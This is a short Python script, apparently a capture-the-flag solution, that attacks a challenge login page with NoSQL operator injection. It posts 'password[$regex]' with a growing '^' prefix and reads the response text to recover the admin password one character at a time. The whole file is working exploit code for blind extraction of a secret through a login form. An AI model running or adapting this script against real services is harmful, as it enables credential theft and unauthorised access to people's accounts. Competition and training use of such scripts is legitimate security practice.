#!/usr/bin/env python

import requests

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}0123456789-!@#%&()'
flag = ''

while True:
    for guess in charset:
        payload = {'user': 'admin', 'password[$regex]': '^' + flag + guess }
        r = requests.post('http://gap.chal.ctf.westerns.tokyo/login.php', data = payload)

        print r.status_code, repr(guess)

        found = r.text.find("Wrong user name or password")
        if found < 0: # login successful
            flag += guess
            print 'flag: ', flag
            break
